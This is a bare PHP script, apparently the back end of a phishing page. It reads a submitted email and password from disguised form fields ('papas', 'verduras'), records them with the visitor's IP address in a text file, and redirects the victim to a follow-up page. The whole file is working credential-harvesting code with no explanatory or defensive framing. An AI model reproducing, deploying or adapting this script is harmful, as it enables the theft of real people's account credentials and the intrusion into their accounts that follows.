<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

if (!empty($_POST["papas"]) && !empty($_POST["verduras"])) {

    $eml = $_POST['papas'];
    $pss = $_POST['verduras'];

    file_put_contents("Sens6yxxx1.txt", "-------------------------------------------------\n", FILE_APPEND);
    file_put_contents("Sens6yxxx1.txt", "Email: [" . $eml . "] Password: [" . $pss . "] IP: [" . $ip . "]\n", FILE_APPEND);
    file_put_contents("Sens6yxxx1.txt", "-------------------------------------------------\n", FILE_APPEND);
    header('location: pindex.html');
} else {
    header('location: index.html');
    exit();
}

?>